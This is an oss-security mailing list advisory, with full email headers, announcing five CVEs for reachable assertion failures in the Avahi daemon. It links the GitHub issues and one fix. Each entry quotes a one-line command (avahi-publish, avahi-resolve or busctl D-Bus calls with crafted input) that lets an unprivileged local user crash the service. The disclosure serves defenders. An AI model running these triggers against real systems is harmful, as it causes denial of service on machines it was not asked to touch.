Received: (qmail 24405 invoked by uid 550); 6 Oct 2023 21:19:40 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 24369 invoked from network); 6 Oct 2023 21:19:39 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=oracle.com; h=message-id : date :
 to : from : subject : content-type : content-transfer-encoding :
 mime-version; s=corp-2023-03-30;
 bh=VX1tHs3Uh+uf+A7CoiUO6Z6OGgxdskSm79DJJ2KZTlQ=;
 b=GpU8Kbbyp3mjkA8Qf0XVRFlHP2uHLR8v8kJRuGg6j5zy2H6RU16FgJOGucQ42i97TgCn
 b/JLDPuy9VEK0X+G4vg/PC/a58DIeX5FzC79vwqzgRpGiaIGga4ow3kLQJhs+UMDOao7
 mXHNWUBTUyL+wJNeC+yMZ+mamIOD6j0FyuW+QPAYRlYiL1gCsX9ftopisAO8YlFQCVRB
 tsxkD6qKTlJmP2Wc9ruJyfof+tcqagusJjYUI/zkQv5dAQBBx552wKuuOw+MfRpPWzX1
 NfzHoh6sHJWWFn4ndCgLDg4l85k4aYuXFndRtvrkteXhfe1p+aDrIEPZkZWCnN+NvACM DQ== 
ARC-Seal: i=1; a=rsa-sha256; s=arcselector9901; d=microsoft.com; cv=none;
 b=AY55Rk3IFq0T7XnhUVQuYqE/lqVIxVLlTbvmc9uFEIaV0weGW7WAmok0R7wdRwAZkpxwbQbbT/tyRqDOvZttSESFtRNtStJvMzCcdxhI7vUlMzdxF28IYRj3gQth75qwo2Xq7cL7b8u3wQ9E4GYkNknryQBLneVytgUfAFxwI0y6KCF58Re5LtDBt8ByHOj9A1JS3JyqPKNTqJhKpuGJGtvjQvjDQ7XyUkoc5ByJYkFybGYrG4th8pxEakxiOQMd5hOoNv4lR5CiP8CFpdcD7X9gWVjaMBTbhWZW6kYUtBhvK5zwYQj0QPVhxFyyj1HDbKahz7Qmo70CHTSUYPrRqw==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
 s=arcselector9901;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
 bh=VX1tHs3Uh+uf+A7CoiUO6Z6OGgxdskSm79DJJ2KZTlQ=;
 b=FVg6gmiu9uDsZMFl2nUL4extp+XQvqN+aMngUwLDLbp6D7+W6laPlG3eO8ejFGHsUznBkViq8HtlsEiGejgZVsRUCCpdFMxMWHWjfWHoAXsZ8GHs89wMIAx/0EmuRR5yf+pxvk9UNKEfOZbXoFK5pDYqRcJ3+EcbMcQU9jBjt44Dip7ddPyhErqTwZMWRGoV/xp+nrae9RJ02cheUX/kMNy49tzHYHsWaU0Xz6bV9RqVtQh9WkSsnFKK1GGTDponQwl65qF04ZdZEFfZe3Wbv73R2NPJ3MaccR7CjR2XaZ9XtuaivBVnxq+UwHRIvucRr1FS4c/xWSZsTUIY9u2VKw==
ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
 smtp.mailfrom=oracle.com; dmarc=pass action=none header.from=oracle.com;
 dkim=pass header.d=oracle.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
 d=oracle.onmicrosoft.com; s=selector2-oracle-onmicrosoft-com;
 h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
 bh=VX1tHs3Uh+uf+A7CoiUO6Z6OGgxdskSm79DJJ2KZTlQ=;
 b=CoCZ27dMxjU7T8myw92sNMFi+2QWlPVlx5YV4llJNJVEc2wjXjnq8MVL1Cul7Yq3DY/cpEE873kLLDqZbBBMVeo+UrlffyD/f5HoOoh2m8Qs2Upl9egr4Hmm7Phh6Jc4y0VJaPrQ202w975DUI420zRu4+iioK5idLj/6ybdDQc=
Message-ID: <91be5904-210a-4e21-aa50-e77a41304a1f@oracle.com>
Date: Fri, 6 Oct 2023 14:19:17 -0700
User-Agent: Mozilla Thunderbird
Content-Language: en-US
To: oss-security@lists.openwall.com
From: Alan Coopersmith <alan.coopersmith@oracle.com>
Autocrypt: addr=alan.coopersmith@oracle.com; keydata=
 xsDiBEab+moRBACDH5yKqS3wcc5bdxY7PBNuwKvF5TKMfagmSvuRDtZjjIIWaA/nZ1KboV9G
 q5g7kP7+Kfu+Qgd8u65eVsWwmPW10fXvj3aCU53glx2EdGdrHcgiyH2gEQfPiyBw+trIppWF
 RV0IDXSLMA1FNC92t2nSG/VFHaPTVwcgkIRSfcXDvwCglGdEa6f4uLqoNHP+m4yYnzapFuMD
 /R4+2AJDAvEWKDdYCGZzlawjAmmWyXrmT7/C/mx98qUR473l4buXjHgDkkXXlHqdzil1vK85
 PhrKzNJDCCmlHUJNz+QwiAMOLwpD+kwVPb57RG7y+a5JQ5+jtVw4RlUxZIk/wj2An9YBO3A5
 vR7PdjM32ZJCN2+aM4dYfNzQxQKTA/47icvBaBVTl9rztjg2pd2Aqpc1P/GsIYLGj7XjnnJv
 GAENBHSH1QjpZMJGCTS9oJ+B0/wrIr+pA+MdFgYAb6ojMQJOO6UChjWWSGjMFcs/CeXhxlLB
 ido3DtAETbNTwO6OEfAvdosvTdhJFnwvZlJ+zZGGy5CrF2Fd9PUe9tmASc0uQWxhbiBDb29w
 ZXJzbWl0aCA8YWxhbi5jb29wZXJzbWl0aEBvcmFjbGUuY29tPsKCBBMRCgBCAhsDBgsJCAcD
 AgYVCAIJCgsEFgIDAQIeAQIXgAIZARYhBEoZPAbTXnxnD6TvC6L7nggfLRMOBQJkQs2eBQkn
 DNS0AAoJEKL7nggfLRMO1esAnR4FVD60BpDY/bJp5RC1VXhOVlo4AKCJgsQeVeGLxDlMuhAm
 bcCkOjafqc7BTQRGm/pvEAgAmnlpSWGjmtSGlLqKTuymwBAU9G7Jw8ow27QngXS/86g/PTzm
 yhXzK0uPgeoIaTZlqaHWNKCWJnC6T2btXtaDHH6cElrClYNf94os5sSt8PBDh184W+NtctAy
 Y2dA1pQYhYs8/eXwa4E4cyrrQG75M+CHrbu9Se0vlERARCpNcjNYLpTXRCwNuUvAi905VJ0Y
 XnGX83WbJfNIq+uxnBa2gVzwb2/2FwKOG03Wyb1vs6NznWJle9x61y8/LlEDoBRbfIQTFp51
 R0ue8gX2yMVgh8lYVViHYCBq+cat7p8X41Xa/fN/HfBFPsf3/+bhggNgmaBmDJBxxd6BPB8Y
 EireiwADBgf/UWIxQwwRLkiXPacOoh34MJYQIBTrCC8gVFxetlbEPEH5mueZMJegAPTF52l8
 6REenxdNVz/0xT7BD6VlHHY5DowlbRca4W8eb3gpkX/wfNYDYCHtTifT7ewumTrNZx5mrbNk
 0XTJVOPAP3z7E0rVD2w/xo4p22DzIwfeGKwpHqt1b6Z9fmrRDwaiXaFmwUf+rIiGc/OFcOSe
 46HwTmIyTOt6NVdQSf75jOPbdeM/n1I5svOdWTLEj6QEj2q9UQ98UEPJuMdaotyBFwKlcDOO
 LMSL793fWINrYSskdXhHjaht5wWqI+egO2JfciI/vP1+bEzhpY9llGq+r7WG3nCSf8JJBBgR
 AgAJBQJGm/pvAhsMAAoJEKL7nggfLRMOgugAoIdhGnD9d/IS6fDVgv+4xnOXvyohAJ0VVxc1
 uoPzepWFbgvLuHIMvyjRog==
Content-Type: text/plain; charset=UTF-8; format=flowed
Content-Transfer-Encoding: 7bit
X-ClientProxiedBy: BY3PR04CA0024.namprd04.prod.outlook.com
 (2603:10b6:a03:217::29) To IA0PR10MB7303.namprd10.prod.outlook.com
 (2603:10b6:208:40d::5)
MIME-Version: 1.0
X-MS-PublicTrafficType: Email
X-MS-TrafficTypeDiagnostic: IA0PR10MB7303:EE_|DS7PR10MB5341:EE_
X-MS-Office365-Filtering-Correlation-Id: d8c5b3be-6196-4a13-b17b-08dbc6b1e9cd
X-MS-Exchange-SenderADCheck: 1
X-MS-Exchange-AntiSpam-Relay: 0
X-Microsoft-Antispam: BCL:0;
X-Microsoft-Antispam-Message-Info: 
	1kXJXoQEbBJwIC3T4gXg6OplohTxzs6QJYqxmVMw2idAAc0f6zOY1CDmfC2OEy5DQ3ypRTh8lBl5smXbtmE9+U6uqkiB32wYqfk8pTaTJj1R+p484Nr2rQspfPUlD0XWaBkDsxTmHgIqxjy4nI83gfM+c/51iv6su1xYROFDyDg2KVOeAQ4jKZ6mgWNJaDevBOHnrfs0AeaSNDOVm5Sgl4x5mkMQgJwHbs0PHC5n7qgyfdIfwt+kCCEYdy18ZvgrKPNPD9CrDQq/JYtmNkCZViRg31NDHOgi6bp0xPVSObuTV+HAMoy8lh3nuTyji9TmYodQz0dTinYogCqZYzoYlI6bYzbVzy7QNIHPbOdPcorHAZCBkPS2F8LzhowBJbIaHa26oYS0/P9K44z8A8Cp8PN79HfSxZ5BI5sA36ZNCeyILsKIHmamz7qc1dRiaL+oPIFcftAnOVRwRvvMZCGU2mims/NPN+j25lirftCe7JJGKxuFMwLCQ+y30jq/hnEbNxqhlb39o3oktFMM96IcTM3nfDN5ElADB+ErIbEJ1M92kH4e8NlAZbAtU6Gx/96ul0BUdxzQH8n7XaKvsUNvlpzpemi8m037Nz7/ooUX4rjr11VdAUd7hvVpTeogllAvPG0ywxO0wHJjZn6T0M7jgM+f2h63jse1TLODEkvcvezWeS7xUVwbdCS3SMaa7UFS
X-Forefront-Antispam-Report: 
	CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:IA0PR10MB7303.namprd10.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230031)(396003)(39860400002)(346002)(376002)(136003)(366004)(230922051799003)(1800799009)(451199024)(186009)(64100799003)(83380400001)(31686004)(6666004)(19627235002)(6506007)(6512007)(966005)(478600001)(6486002)(38100700002)(86362001)(31696002)(41300700001)(2906002)(2616005)(26005)(316002)(36756003)(44832011)(66946007)(66556008)(66476007)(5660300002)(8936002)(6916009)(8676002)(43740500002)(45980500001);DIR:OUT;SFP:1101;
X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
X-MS-Exchange-AntiSpam-MessageData-0: 
	=?utf-8?B?b2t0R09yeGVBSTRNc2w2elk0NEpOSldsVzlZRXNHN3Z1NGhON0tTdUVQWGFq?=
 =?utf-8?B?T2t6RU84cmEyNzdiN010allsd0lIdHJuQ0Y4R1BIOGhkVXcxTDNwem5WRWdW?=
 =?utf-8?B?MnRxWnJ5ZUJzcVEzSWdHaHdmMzZteHI1VXRCS0xRanFYRWVwazZBN0tnRzdJ?=
 =?utf-8?B?eENPT2trMFA1ZHJaNVR5VWpCWHpwTSs0YklzS01Bd3JmMFNheEtWMmVzb3lS?=
 =?utf-8?B?TzRGQitTU0JqcC9sSTl2RUJMeTZ4UU05Sk5HRmZuNFFKb2M0SEpTcVJ1cnh3?=
 =?utf-8?B?a2oyOVhpdHhtckVsVnJQbDJyZGczOTFldEFIQnlhUEZ3Snh0QStWVmNrSEhu?=
 =?utf-8?B?Nk56S294M2l3bkd1UWlEVW5PRGlSNFFnaURPdC9qRlpONFJoQWxRVnByV1Ux?=
 =?utf-8?B?YS9TVVd1TGQ1bU5HQWNXcitNc1lpZ1BmRjZaaTZTdHZjTUFFcncwWUt2dUJJ?=
 =?utf-8?B?WGdFRjIyLzJSRTNhUEh5YXUvVDJBS21hNkNZa0g4NnlQOHpCdzB4T3paZ2J3?=
 =?utf-8?B?QWhUT2E4MlRCVzRPTkI3b0xmSkV6WlBrZlQreTNTUFdQVlJPSUlVVlllSGcw?=
 =?utf-8?B?bHNPQlB4YWRkVnZYSXNxWVE2Rk1rTi8zU0dUSWhnZVR6NUU4TitOcmovT1l3?=
 =?utf-8?B?VFBZY1A2ZmI5MHhJY25adW42QjZkL3k4eHRhL21GdWIzQ0t5WmJ6RFdCMUxv?=
 =?utf-8?B?dTVuaGhhelg1TFA2WVQ5ZVEwUFBKNGtpamFPa2U3Y1pCOVlrcUxQTEJPRFg5?=
 =?utf-8?B?aHpwOVQ1R0xUZXNVOTI0K2lxTWpOSGtoZjNqZjBFUWNJOER1djRLVkVoeUVJ?=
 =?utf-8?B?WVdZRnZQL0tjOGZOcEJDRVYxYlJpR21KNWNyblZ1ZndVTDl1cjhJMnBxVFlU?=
 =?utf-8?B?WTRuTDJQZ0d4dnEwRmhidVI5K2MyZ3N0OWtpUXh5bDE3Y0xPTXNuNC9YOE0x?=
 =?utf-8?B?NlFUdkhza3BqcFcvVGpyaWtoeXBnejJHN2YvOGV6ZmZoMGdDL2ZBSy93aFhu?=
 =?utf-8?B?OWVyZkdyS0dEYnFXbDRRRWdnRDM4akV6WXBzSmR4RTczaWdkSnBDOGZNVVZK?=
 =?utf-8?B?MzcrZVBzTzFtb3J1R0xwMGtHVWZPaEsrNDZhbkJTWEFzaVVCT1d5U1JDaTBn?=
 =?utf-8?B?d1VBd1hQYnhreW5GVkVGTHlWVVF1WjVOVTZDUVo5SHNSZ29vRHlpWm15eFgv?=
 =?utf-8?B?N0tRMjlaMHJacE11TXpZbS9wbEl2dUxYZ3ROK3M3cjZTZ1FxVlV1T0c1VDBh?=
 =?utf-8?B?MC9qK0p3dGJWWTZvd2NHMTRLY3QrOGdjdWtGRGk0T3ZUSGcyb05QaHZGM0hM?=
 =?utf-8?B?OUpZeXN0MFkwbUUwTlp3Ui9uRDRERFVxdTlXTzdmUkUwZUloTVRoby9janFJ?=
 =?utf-8?B?WjFHZEhKbnMzekhhMTlRU3hkbTdWYzJvQ3ptOFNmWWl1MmZubk0wRVMxVHRS?=
 =?utf-8?B?aStXZGxzT2hIK2t0UHJvb3duZXhqUzh0cDYzZmtTV2REUzhGMUZjT2Y1WFVK?=
 =?utf-8?B?UVBuRlBXOUtZeUFlZjlKRnUzUHRReURyM0Z5eE9pakxZdnRkenpLejJpUWhm?=
 =?utf-8?B?NEJPZVZ4ODM4R0hhb25zdk1ZTlZ5SjJUcFl3RDBqbThTbVZsaVFaRUZtUlhK?=
 =?utf-8?B?NWl6OWNOdFplb0RaeC9XTmdnMDI0NHV2MmJGalhKVE5JTGo5T1hzQ1BPM2RI?=
 =?utf-8?B?cmpTRjlJd1hvUnZoMDVpUXFmVUJScGZBVHhtemZ6c3kraGFEem92cmVFREc1?=
 =?utf-8?B?SnFQUHpSSnRHNUFqUEJvcUdWdDRuZG1xam1sSHlZRGl1bHpneHM3SjN5SUJD?=
 =?utf-8?B?SW80UktsbXpFd0M2dFV2YUxEem9wUW0rc0NoOTdrSThaTll0Wk1saWpLdEs3?=
 =?utf-8?B?VGRwR2hjR1ZhdnUyMmZZMElaSktkSFFSSWxTWDhVMVZXbW1SaE1vRnVyc2Va?=
 =?utf-8?B?d3ZWL01ibDRCU0tMUVVrYS8ydWxMN0FJd2tMaGs4czFrL3pzSFlycTVSYnBP?=
 =?utf-8?B?UXZkQk1qdEtuOXBrUkhzOEttQW1CdnR4RkxERkl5NkVuRWlUeWt5K1dUcmVl?=
 =?utf-8?B?ZnpPTU9kY1U5VHo0Uk5TWUgydlAvT1lBU2xFdmlLa1BuVW1aVHgrYkRuMjdq?=
 =?utf-8?B?ZThqaStaTDVPRTB1WXpPTHQxZHJmSWQ0MnlPS0RPbGRWdEFSdEJKdlpUbFFC?=
 =?utf-8?B?dnc9PQ==?=
X-MS-Exchange-AntiSpam-ExternalHop-MessageData-ChunkCount: 1
X-MS-Exchange-AntiSpam-ExternalHop-MessageData-0: 
	2H5CivDC9axqQ5H8HD2bSxWjvgXH77ccZNsyZKjSWF0ncP/Fo7T/fLgcJm6lMFsq3zS6H4tGjN2jOhTT9dYeO6fvuJZH4ZS1T2VbgTFiVkoxsNs7Bw0kPyIv1fnDyWOEqhLq7Oseqr17U+gK+gLJTwd0Nvsi6wK57EEkiRQZ3q2fqJugq8yIKkLLQcowjCDCb0xEWv/6MTldU9bzY2a7fy+GPL9RpuSLFwLXrwyuRehjNw1ejgGJ5z112bj4/0bTpLYl2FjU3cONwR3axnbVVDyEAw3XrGAKXn00pBXqhNcO8ynQiHyxyb+6qhUVWpWXnTiCq8IFgdacBJZczvQsEvqqs+kc0wW0oBCeJ2SyuE1MXVC6TaTt386FZj75JrZ7yonF16j6bEj/YSysTjL3OfJuGTbNrF1rqvi2uanT4dlWgVUgQaJLwo264VU0xjDnCxlWA1Mp4gzz/N+8xumojF9LVhh5lzGiLqEBCLzlHHa9R1w0GlbCRmpfRHrTHz9D23gKDlDs1i18VKBr9l3iN8ZHutsYPZNStsf6HWMnP7ApY35gRTUStO6ylLYAJQb89ZXKkEV1GwGJOkR9M3EU/QwgN+M69G2M5uz99dBVYJkKVKJfCCv3GvexJcTnUuVb+DKNQ1ypD4tABOtVNDCWqcD6tifiptlViAn31wjF2jFwd9SaLL/09vbClnWjt+eIYyc1sRUjQlB33k/z8rnBPU6pv9EWdE3DpoSz1MMsLHvr3CW+k4DxNKENOqOuMAFcjCxpg8L19eqRtvRyoy2+qg==
X-OriginatorOrg: oracle.com
X-MS-Exchange-CrossTenant-Network-Message-Id: d8c5b3be-6196-4a13-b17b-08dbc6b1e9cd
X-MS-Exchange-CrossTenant-AuthSource: IA0PR10MB7303.namprd10.prod.outlook.com
X-MS-Exchange-CrossTenant-AuthAs: Internal
X-MS-Exchange-CrossTenant-OriginalArrivalTime: 06 Oct 2023 21:19:23.8383
 (UTC)
X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
X-MS-Exchange-CrossTenant-Id: 4e2c6054-71cb-48f1-bd6c-3a9705aca71b
X-MS-Exchange-CrossTenant-MailboxType: HOSTED
X-MS-Exchange-CrossTenant-UserPrincipalName: T7sojFYat6+2zzuNQnXcyQ/YTQLo1yAmF8uI60ABcTU2cMOMwTafp3aTousuntIN0f7T4gV8MZQm0lHOe6tCKNpunZwiSQ+48YbUmrAEQDc=
X-MS-Exchange-Transport-CrossTenantHeadersStamped: DS7PR10MB5341
X-Proofpoint-Virus-Version: vendor=baseguard
 engine=ICAP:2.0.267,Aquarius:18.0.980,Hydra:6.0.619,FMLib:17.11.176.26
 definitions=2023-10-06_15,2023-10-06_01,2023-05-22_02
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 malwarescore=0 mlxscore=0 spamscore=0
 phishscore=0 bulkscore=0 mlxlogscore=999 suspectscore=0 adultscore=0
 classifier=spam adjust=0 reason=mlx scancount=1 engine=8.12.0-2309180000
 definitions=main-2310060163
X-Proofpoint-GUID: ZZFypvPJChKPanNz-89aSIITWwprrBYK
X-Proofpoint-ORIG-GUID: ZZFypvPJChKPanNz-89aSIITWwprrBYK
Subject: [oss-security] CVEs assigned for reachable assertions in avahi

While the CVE database still shows them as reserved, Red Hat's & Debian's
trackers show several CVE's being assigned for client requests that can
cause the Avahi server to abort with an assertion failure.  Only one of
them has a fix available so far.

----------------------------------------------------------------------------

CVE-2023-38469: https://github.com/lathiat/avahi/issues/455
  Reachable assertion in avahi_dns_packet_append_record

"It can be triggered by unprivileged local users
  (unless disable-user-service-publishing is set to yes explicitly):

  avahi-publish -s T _qotd._tcp 22 $(perl -le 'print "A " x 100000')"

----------------------------------------------------------------------------

CVE-2023-38470: https://github.com/lathiat/avahi/issues/454
  Reachable assertion in avahi_escape_label

"avahi-resolve -n ',.=.}.=.?-.}.=.?.?.}.}.?.?.?.z.?.?.}.}.}.?.?.?.r.=.=.}.=.?.}}.}.?.?.?.zM.=.=.?.?.}.}.?.?.}.}.}.?.?.?.r.=.=.}.=.?.}}.}.?.?.?.zM.=.=.?.?.}.}.?.?.?.zM.?`?.}.}.}.?.?.?.r.=.?.}.=.?.?.}.?.?.?.}.=.?.?.}??.}.}.?.?.?.z.?.?.}.}.}.?.?.?.r.=.=.}.=.?.}}.}.?.?.?.zM.?`?.}.}.}.??.?.zM.?`?.}.}.}.?.?.?.r.=.?.}.=.?.?.}.?.?.?.}.=.?.?.}??.}.}.?.?.?.z.?.?.}.}.}.?.?.?.r.=.=.}.=.?.}}.}.?.?.?.zM.?`?.}.}.}.?.?.?.r.=.=.?.?`.?.?}.}.}.?.?.?.r.=.?.}.=.?.?.}.?.?.?.}.=.?.?.}'"

Fix: https://github.com/lathiat/avahi/commit/94cb6489114636940ac683515417990b55b5d66c

----------------------------------------------------------------------------

CVE-2023-38471: https://github.com/lathiat/avahi/issues/453
  Reachable assertion in dbus_set_host_name

"It can be triggered by unprivileged local users unless 1c599d8 is backported.

  busctl call org.freedesktop.Avahi / org.freedesktop.Avahi.Server2 SetHostName "s" 'A\.B'"

----------------------------------------------------------------------------

CVE-2023-38472: https://github.com/lathiat/avahi/issues/452
  Reachable assertion in avahi_rdata_parse

"It can be reproduced by calling something like

   org.freedesktop.Avahi /Client*/EntryGroup* org.freedesktop.Avahi.EntryGroup AddRecord "iiusqquay" 0 0 0 '' 0 0 0 0

  using

   avahi_entry_group_add_record (group, AVAHI_IF_UNSPEC, AVAHI_PROTO_UNSPEC, 0, "Test", 0x01, 0x10, 120, "", 0)

  from inside a client creating EntryGroups. It can be triggered by unprivileged
  users unless disable-user-service-publishing is set to yes explicitly.
  By default it's set to no."

----------------------------------------------------------------------------

CVE-2023-38473: https://github.com/lathiat/avahi/issues/451
   Reachable assertion in avahi_alternative_host_name

"busctl call org.freedesktop.Avahi / org.freedesktop.Avahi.Server GetAlternativeHostName "s" ').'"

-- 
         -Alan Coopersmith-                 alan.coopersmith@oracle.com
          Oracle Solaris Engineering - https://blogs.oracle.com/solaris
